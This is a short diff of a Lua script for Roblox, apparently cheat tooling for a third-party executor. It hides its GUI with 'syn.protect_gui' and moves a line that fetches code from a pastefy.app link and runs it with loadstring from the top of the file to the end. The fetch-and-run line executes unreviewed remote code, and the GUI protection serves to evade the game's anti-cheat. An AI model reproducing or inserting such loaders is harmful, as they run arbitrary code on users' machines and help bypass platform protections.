@@ -1,6 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()
 
--- GUI Protection
 if not game:IsLoaded() then game.Loaded:Wait() end
 pcall(function() if syn and syn.protect_gui then syn.protect_gui(Instance.new("ScreenGui")) end end)
 
@@ -61,4 +59,4 @@ spawn(function()
         end
     end
 end)
-
+loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()
